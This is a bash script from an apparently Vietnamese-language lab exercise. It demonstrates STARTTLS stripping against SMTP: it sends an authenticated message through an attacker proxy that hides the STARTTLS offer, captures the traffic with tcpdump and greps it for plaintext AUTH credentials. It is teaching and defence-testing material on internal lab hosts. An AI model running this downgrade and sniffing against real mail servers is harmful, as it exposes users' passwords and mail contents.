#!/usr/bin/env bash
# AT-06  Tan cong ha cap STARTTLS (STARTTLS stripping / downgrade)
#   Chay tren vm-client (10.30.0.50), SAU khi vm-atk da chay:
#       sudo bash attacks/atk-run-strip-proxy.sh start
#   va mail1/mail2 da o che do opportunistic TLS (defense/d02b-tls-may.sh).
#   sudo bash attacks/at06-starttls-strip.sh
#
# Y nghia: SMTP client "tot bung" - thay STARTTLS thi dung, khong thay thi van
# gui ban ro. Ke trung gian chi can AN mot dong '250-STARTTLS' trong phan hoi
# EHLO la toan bo bo mat ma hoa bien mat.
set -uo pipefail   # KHONG dung -e: 5xx/RCPT bi tu choi la KET QUA do duoc, khong phai loi script

SELF="$(readlink -f "$0")"; PROJECT="$(dirname "$(dirname "$SELF")")"
EVID=/root/evidence/client; mkdir -p "$EVID"
PCAP="$EVID/at06-downgrade.pcap"
TXT="$EVID/at06-downgrade.txt"
rm -f "$PCAP"

echo "=== [0] DIEU KIEN: mail1:587 phai dang quang ba STARTTLS (sau d02b) ==="
# Khong dung ncat (chi duoc cai o vai atk) - python3 co tren ca 5 VM.
DIRECT="$(python3 - <<'PY'
import socket
s = socket.create_connection(('10.30.0.20', 587), 6)
f = s.makefile('rb')
out = [f.readline().decode(errors='replace').rstrip()]
s.sendall(b'EHLO client.congtyA.test\r\n')
while True:
    l = f.readline().decode(errors='replace').rstrip()
    out.append(l)
    if not l or l.startswith('250 '):
        break
s.sendall(b'QUIT\r\n')
s.close()
print('\n'.join(out))
PY
)"
echo "$DIRECT" | grep -E '^(220|250)' | sed 's/^/  /'
if ! echo "$DIRECT" | grep -qi 'STARTTLS'; then
  echo
  echo "DUNG LAI: mail1 chua quang ba STARTTLS. Chay defense/d02b-tls.sh may tren vm-mail1 truoc."
  exit 1
fi

echo
echo "=== [1] DOI CHIEU: ket noi TRUC TIEP mail1:587, YEU CAU TLS (swaks --tls) ==="
swaks --server mail1.congtyA.test --port 587 --tls \
      --from 'giamdoc@congtyA.test' --to 'ketoan@congtyB.test' \
      --auth LOGIN --auth-user giamdoc --auth-password 'Lab@2026' \
      --header 'Subject: [AT-06 baseline] Qua TLS - khong nghe duoc' \
      --header 'X-Lab-Mark: AT-06-BASELINE' \
      --body "@$PROJECT/attacks/payloads/invoice-legit.txt" 2>&1 | tee "$EVID/at06-baseline.log" | tail -22

echo
echo "=== [2] TAN CONG: cung thu do, gui QUA PROXY 10.30.0.40:2525 (opportunistic TLS) ==="
tcpdump -i any -nn -s0 -w "$PCAP" 'tcp port 2525' >/dev/null 2>&1 &
DPID=$!
sleep 2
swaks --server 10.30.0.40 --port 2525 --tls-optional \
      --from 'giamdoc@congtyA.test' --to 'ketoan@congtyB.test' \
      --auth LOGIN --auth-user giamdoc --auth-password 'Lab@2026' \
      --header 'Subject: [AT-06 attack] Hop dong HD-2026-0713-STB-123' \
      --header 'X-Lab-Mark: AT-06-STRIPPED' \
      --body "@$PROJECT/attacks/payloads/invoice-legit.txt" 2>&1 | tee "$EVID/at06-attack.log"
RC=$?
sleep 2
kill "$DPID" 2>/dev/null || true
sleep 1

echo
echo "=== [3] Phan tich bao goi tren chinh may client (cong 2525) ==="
{
  echo "# time $(date -u '+%F %T') UTC - pcap $PCAP (swaks exit code = $RC)"
  echo "--- Client co nhin thay STARTTLS khong? ---"
  { tcpdump -r "$PCAP" -A -nn 2>/dev/null | grep -a -c 'STARTTLS' || true; } | sed 's/^/  so dong chua STARTTLS trong bao goi: /'
  echo "--- Phan hoi EHLO ma client nhan duoc tu proxy ---"
  tcpdump -r "$PCAP" -A -nn 2>/dev/null | grep -a -E '^250' | head -10 | sed 's/^/  /'
  echo "--- AUTH + mat khau ban ro ---"
  tcpdump -r "$PCAP" -A -nn 2>/dev/null | grep -a -E 'AUTH|334|Subject:|X-Lab-Mark|9999999999|1029384756' | head -12 | sed 's/^/  /'
  echo "--- Ma hoi dap (2 duoc phat / 5 bi tu choi) ---"
  tcpdump -r "$PCAP" -A -nn 2>/dev/null | grep -a -E '^(25|55|45)' | head -8 | sed 's/^/  /'
} | tee "$TXT"

echo
echo
echo
